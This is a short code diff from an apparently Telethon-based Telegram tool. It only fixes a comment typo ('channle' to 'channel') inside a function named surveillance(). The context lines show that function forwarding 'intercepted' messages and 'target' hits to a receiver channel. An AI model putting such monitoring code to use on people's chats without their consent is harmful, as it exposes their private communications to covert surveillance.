@@ -267,7 +267,7 @@ def surveillance():
             fwd = await client(ForwardMessagesRequest(
                 from_peer=event.message.to_id,  # sender of this intercepted message
                 id=[event.message.id],          # id of this intercepted messages
-                to_peer=receiver                # receiver channle id
+                to_peer=receiver                # receiver channel id
             ))
             composed = await compose(sender, to_id)
             message = sendMessage(composed, mtype='all')
@@ -279,7 +279,7 @@ def surveillance():
             fwd = await client(ForwardMessagesRequest(
                 from_peer=event.message.to_id,  # sender of this intercepted message
                 id=[event.message.id],          # id of this intercepted messages
-                to_peer=receiver                # receiver channle id
+                to_peer=receiver                # receiver channel id
             ))
             composed = await compose(sender, to_id)
             message = sendMessage(composed, mtype='all')
@@ -294,7 +294,7 @@ def surveillance():
                 fwd = await client(ForwardMessagesRequest(
                     from_peer=event.message.to_id,  # sender of this intercepted message
                     id=[event.message.id],          # id of this intercepted messages
-                    to_peer=special_channel         # receiver channle id
+                    to_peer=special_channel         # receiver channel id
                 ))
                 # print("Target hit!")
                 break
